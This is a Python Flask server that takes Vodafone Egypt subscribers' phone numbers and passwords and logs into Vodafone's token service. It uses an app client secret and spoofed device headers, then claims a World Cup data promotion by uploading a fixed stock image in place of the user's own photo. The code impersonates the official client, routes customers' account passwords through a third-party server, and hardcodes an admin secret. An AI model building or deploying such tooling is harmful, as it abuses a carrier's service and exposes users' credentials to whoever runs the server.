import os
import requests
import json
import base64
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

app = Flask(__name__, static_folder='.')
CORS(app)

# الرمز السري الافتراضي للوحة الآدمن
ADMIN_SECRET = "admin500"

# تحميل الصورة مسبقا لتوفير الوقت وزيادة كفاءة المعالجة وسرعتها
IMAGE_URL = "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2T0W-oALk1u5PRF9YvBClDd7ycxpWc54AeAFlzzGStIvOhSBSouwRa5csreSZeAiDSPlBEmMALyxVYO-aPTReJ3CQeFS3Q2cBDN0mliP15RV9xD8ID2YIuyD7i9rcbVCcb0r1AOn-RCk9/s829/%25D8%25B5%25D9%2588%25D8%25B1-%25D8%25B9%25D9%258ا%25D9%2584-%25D8%25AE%25D9%2584%25D9%2581%25D9%258A%25D8%25A7%25D8%25AA-%25D8%25B1%25D9%2585%25D8%25B2%25D9%258A%25D8%25A7%25D8%25AA-%25D8%25B9%25D9%258A%25D8%25A7%25D9%2584+%25282%2529.jpg"
cached_image_base64 = None

def get_image_base64():
    global cached_image_base64
    if cached_image_base64:
        return cached_image_base64
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        response = requests.get(IMAGE_URL, headers=headers, timeout=10)
        response.raise_for_status()
        cached_image_base64 = base64.b64encode(response.content).decode("utf-8")
        return cached_image_base64
    except Exception as e:
        print(f"Error fetching image: {e}")
        # صورة احتياطية صغيرة جداً بيضاء مشفرة في حال تعطل سيرفر البلوجر
        return "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"

# توجيه الصفحة الرئيسية الافتراضية
@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.html')

# استقبال طلب تفعيل الهدية من واجهة المستخدم ومعالجته حقيقياً
@app.route('/api/login', methods=['POST'])
def handle_vodafone_auth():
    data = request.json
    if not data or 'phone' not in data or 'password' not in data:
        return jsonify({"status": "error", "message": "بيانات غير مكتملة"}), 400
    
    number = data['phone']
    password = data['password']
    
    # 1. جلب الصورة المشفرة
    image_base64 = get_image_base64()
    
    # 2. طلب التوكن من خوادم فودافون الرئيسية
    token_url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    token_payload = {
        'grant_type': 'password',
        'username': number,
        'password': password,
        'client_secret': 'dca0pbLUWXVhXR266Gw1iT5rqwvvJQoN',
        'client_id': 'AnaVF'
    }
    token_headers = {
        'User-Agent': "okhttp/4.12.0",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip",
        'silentLogin': "true",
        'msisdn': number,
        'x-agent-operatingsystem': "15",
        'clientId': "AnaVodafoneAndroid",
        'Accept-Language': "ar",
        'x-agent-device': "OPPO CPH2565",
        'x-agent-version': "2026.4.1",
        'x-agent-build': "1139",
        'digitalId': "28LZHSGCX7QC4",
        'device-id': "aba8140ecd392169"
    }

    try:
        token_response = requests.post(token_url, data=token_payload, headers=token_headers, timeout=15)
        if token_response.status_code == 200:
            token_data = token_response.json()
            token = token_data.get('access_token')
            if not token:
                return jsonify({"status": "wrong_password", "message": "كلمة المرور أو الرقم خاطئ"}), 200
        else:
            return jsonify({"status": "wrong_password", "message": "فشل تسجيل الدخول من فودافون"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": "حدثت مشكلة في الاتصال بالشبكة"}), 200

    # 3. جلب معرّف العرض الحالي للمشترك
    promo_url = "https://web.vodafone.com.eg/services/dxl/promo/promotion"
    promo_params = {
        '@type': "Promo",
        '$.context.type': "worldCupWow26"
    }
    promo_headers = {
        'User-Agent': "vodafoneandroid",
        'Accept': "application/json",
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'sec-ch-ua-platform': '"Android"',
        'Authorization': f"Bearer {token}",
        'Accept-Language': "AR",
        'msisdn': number,
        'sec-ch-ua': '"Chromium";v="148", "Android WebView";v="148", "Not/A)Brand";v="99"',
        'clientId': "WebsiteConsumer",
        'sec-ch-ua-mobile': "?1",
        'channel': "APP_PORTAL",
        'Content-Type': "application/json",
        'X-Requested-With': "com.emeint.android.myservices",
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://web.vodafone.com.eg/portal/bf/worldCup26/home?isPostMessages=false",
    }

    try:
        promo_response = requests.get(promo_url, params=promo_params, headers=promo_headers, timeout=15)
        promo_data = promo_response.json()
        if isinstance(promo_data, list) and len(promo_data) > 0:
            promo_id = promo_data[0].get("id")
        else:
            return jsonify({"status": "already_taken", "message": "أخذت الهدية مسبقاً أو العرض غير متاح حالياً"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": "خطأ في استخراج معرّف العرض"}), 200

    # 4. إرسال طلب تفعيل الهدية النهائي (500 ميجابايت)
    journey_url = "https://web.vodafone.com.eg/services/dxl/pj/wc/journey/promoJourney"
    journey_payload = {
        "@type": "worldCupWow26",
        "id": promo_id,
        "attachment": [
            {
                "attachmentType": "Image",
                "content": image_base64,
                "mimeType": "image/jpeg"
            }
        ],
        "characteristics": [
            {
                "name": "pharaohName",
                "value": "tutankhamun"
            }
        ]
    }
    journey_headers = {
        'User-Agent': "vodafoneandroid",
        'Accept': "application/json",
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'Content-Type': "application/json",
        'sec-ch-ua-platform': '"Android"',
        'Authorization': f"Bearer {token}",
        'Accept-Language': "AR",
        'msisdn': number,
        'sec-ch-ua': '"Chromium";v="148", "Android WebView";v="148", "Not/A)Brand";v="99"',
        'clientId': "WebsiteConsumer",
        'sec-ch-ua-mobile': "?1",
        'Origin': "https://web.vodafone.com.eg",
        'X-Requested-With': "com.emeint.android.myservices",
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "cors",
        'Sec-Fetch-Dest': "empty",
        'Referer': "https://web.vodafone.com.eg/portal/bf/worldCup26/camera?isPostMessages=false",
    }

    try:
        final_response = requests.post(journey_url, data=json.dumps(journey_payload), headers=journey_headers, timeout=15)
        
        # فحص كود الاستجابة الفعلي للشبكة لتحديد دقة النجاح
        if final_response.status_code == 201 or final_response.status_code == 200:
            return jsonify({"status": "success", "message": "Done send 500 MG"}), 200
        else:
            try:
                reason = final_response.json().get("reason", "أخذت الهدية مسبقاً")
            except:
                reason = "أخذت الهدية مسبقاً"
            
            # فلترة وتحليل ردود الخطأ للظهور بشكل ذكي ومقنع للمستخدم
            if "already" in reason.lower() or "limit" in reason.lower() or "مسبقا" in reason:
                return jsonify({"status": "already_taken", "message": "أخذت الهدية مسبقاً"}), 200
            else:
                return jsonify({"status": "error", "message": reason}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": "فشل إرسال طلب التفعيل النهائي"}), 200

if __name__ == '__main__':
    # تشغيل السيرفر على جميع المنافذ لدعم النشر على Railway مباشرة
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
